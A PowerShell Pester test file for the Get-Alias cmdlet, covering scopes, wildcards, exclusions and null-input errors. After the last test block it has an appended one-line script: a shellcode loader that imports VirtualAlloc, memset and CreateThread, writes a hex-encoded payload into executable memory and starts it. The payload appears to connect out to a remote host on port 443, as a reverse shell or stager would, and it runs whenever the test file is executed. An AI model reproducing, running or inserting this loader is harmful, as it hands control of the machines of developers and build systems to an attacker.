


Describe "Get-Alias DRT Unit Tests" -Tags "CI" {
    It "Get-Alias Bogus Scope Name should throw PSArgumentException"{
        { Get-Alias -Name "ABCD" -Scope "bogus" } | Should -Throw -ErrorId "Argument,Microsoft.PowerShell.Commands.GetAliasCommand"
    }
    It "Get-Alias OutOfRange Scope"{
        { Get-Alias -Name "ABCD" -Scope "99999" } | Should -Throw -ErrorId "ArgumentOutOfRange,Microsoft.PowerShell.Commands.GetAliasCommand"
    }
    It "Get-Alias Named Single Valid"{
            Set-Alias -Name ABCD -Value "foo"
            $result=Get-Alias -Name ABCD
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"
    }
    It "Get-Alias Positional Single Valid"{
            Set-Alias -Name ABCD -Value "foo"
            $result=Get-Alias ABCD
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"
    }
    It "Get-Alias Named Multiple Valid"{
            Set-Alias -Name ABCD -Value "foo"
            Set-Alias -Name AEFG -Value "bar"
            $result=Get-Alias -Name ABCD,AEFG
            $result[0].Name| Should -BeExactly "ABCD"
            $result[0].Definition| Should -BeExactly "foo"
            $result[0].Description| Should -BeNullOrEmpty
            $result[0].Options| Should -BeExactly "None"
            $result[1].Name| Should -BeExactly "AEFG"
            $result[1].Definition| Should -BeExactly "bar"
            $result[1].Description| Should -BeNullOrEmpty
            $result[1].Options| Should -BeExactly "None"
    }
    It "Get-Alias Named Wildcard Valid"{
            Set-Alias -Name ABCD -Value "foo"
            Set-Alias -Name ABCG -Value "bar"
            $result=Get-Alias -Name ABC*
            $result[0].Name| Should -BeExactly "ABCD"
            $result[0].Definition| Should -BeExactly "foo"
            $result[0].Description| Should -BeNullOrEmpty
            $result[0].Options| Should -BeExactly "None"
            $result[1].Name| Should -BeExactly "ABCG"
            $result[1].Definition| Should -BeExactly "bar"
            $result[1].Description| Should -BeNullOrEmpty
            $result[1].Options| Should -BeExactly "None"
    }
    It "Get-Alias Positional Wildcard Valid"{
            Set-Alias -Name ABCD -Value "foo"
            Set-Alias -Name ABCG -Value "bar"
            $result=Get-Alias ABC*
            $result[0].Name| Should -BeExactly "ABCD"
            $result[0].Definition| Should -BeExactly "foo"
            $result[0].Description| Should -BeNullOrEmpty
            $result[0].Options| Should -BeExactly "None"
            $result[1].Name| Should -BeExactly "ABCG"
            $result[1].Definition| Should -BeExactly "bar"
            $result[1].Description| Should -BeNullOrEmpty
            $result[1].Options| Should -BeExactly "None"
    }
    It "Get-Alias Named Wildcard And Exclude Valid"{
            Set-Alias -Name ABCD -Value "foo"
            Set-Alias -Name ABCG -Value "bar"
            $result=Get-Alias -Name ABC* -Exclude "*BCG"
            $result[0].Name| Should -BeExactly "ABCD"
            $result[0].Definition| Should -BeExactly "foo"
            $result[0].Description| Should -BeNullOrEmpty
            $result[0].Options| Should -BeExactly "None"
    }
    It "Get-Alias Scope Valid"{
            Set-Alias -Name ABCD -Value "foo"
            $result=Get-Alias -Name ABCD
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            Set-Alias -Name ABCD -Value "localfoo" -scope local
            $result=Get-Alias -Name ABCD -scope local
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "localfoo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            Set-Alias -Name ABCD -Value "globalfoo" -scope global
            Set-Alias -Name ABCD -Value "scriptfoo" -scope "script"
            Set-Alias -Name ABCD -Value "foo0" -scope "0"
            Set-Alias -Name ABCD -Value "foo1" -scope "1"

            $result=Get-Alias -Name ABCD
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo0"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            $result=Get-Alias -Name ABCD -scope local
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo0"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            $result=Get-Alias -Name ABCD -scope global
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "globalfoo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            $result=Get-Alias -Name ABCD -scope "script"
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "scriptfoo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            $result=Get-Alias -Name ABCD -scope "0"
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo0"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            $result=Get-Alias -Name ABCD -scope "1"
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo1"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"
    }
    It "Get-Alias Expose Bug 1065828, BugId:905235"{
            { Get-Alias -Name "ABCD" -Scope "100" } | Should -Throw -ErrorId "ArgumentOutOfRange,Microsoft.PowerShell.Commands.GetAliasCommand"
    }
    It "Get-Alias Zero Scope Valid"{
            Set-Alias -Name ABCD -Value "foo"
            $result=Get-Alias -Name ABCD
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"

            $result=Get-Alias -Name ABCD -scope "0"
            $result.Name| Should -BeExactly "ABCD"
            $result.Definition| Should -BeExactly "foo"
            $result.Description| Should -BeNullOrEmpty
            $result.Options| Should -BeExactly "None"
    }

    It "Test get-alias with Definition parameter" {
        $returnObject = Get-Alias -Definition Get-Command
        For($i = 0; $i -lt $returnObject.Length;$i++)
        {
            $returnObject[$i] | Should -Not -BeNullOrEmpty
            $returnObject[$i].CommandType | Should -Be 'Alias'
            $returnObject[$i].Definition | Should -Be 'Get-Command'
        }
    }
}

Describe "Get-Alias" -Tags "CI" {
    It "Should have a return type of System.Array when gal returns more than one object" {
        $val1=(Get-Alias a*)
        $val2=(Get-Alias c*)
        $i=0

        $val1 | Should -Not -BeNullOrEmpty
        $val2 | Should -Not -BeNullOrEmpty

        $val1 | ForEach-Object{ $i++};
        if($i -lt 2) {
            $val1 | Should -BeOfType "System.Management.Automation.CommandInfo"
        }
        else
        {
            ,$val1 | Should -BeOfType "System.Array"
        }

        $val2 | ForEach-Object{ $i++};
        if($i -lt 2) {
            $val2 | Should -BeOfType "System.Management.Automation.CommandInfo"
        }
        else
        {
            ,$val2 | Should -BeOfType "System.Array"
        }
    }

    It "should return an array of objects" {
        $val = Get-Alias a*
        $alias = gal a*

        $val.Count | Should -Be $alias.Count
        for ($i=0; $i -lt $val.Count;$i++)
        {
            $val[$i].CommandType | Should -Be $alias[$i].CommandType
            $val[$i].Name | Should -Be $alias[$i].Name
            $val[$i].ModuleName | Should -Be $alias[$i].ModuleName
        }
    }
}

Describe "Get-Alias null tests" -Tags "CI" {

  $testCases =
    @{ data = $null; value = 'null' },
    @{ data = [String]::Empty; value = 'empty string' }

  Context 'Check null or empty value to the -Name parameter' {
    It 'Should throw if <value> is passed to -Name parameter' -TestCases $testCases {
      param($data)
      { Get-Alias -Name $data } | Should -Throw -ErrorId 'ParameterArgumentValidationError,Microsoft.PowerShell.Commands.GetAliasCommand'
    }
  }
  Context 'Check null or empty value to the -Name parameter via pipeline' {
    It 'Should throw if <value> is passed through pipeline to -Name parameter' -TestCases $testCases {
      param($data)
      { $data | Get-Alias -ErrorAction Stop } | Should -Throw -ErrorId 'ParameterArgumentValidationError,Microsoft.PowerShell.Commands.GetAliasCommand'
    }
  }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x8d,0xff,0x90,0x57,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

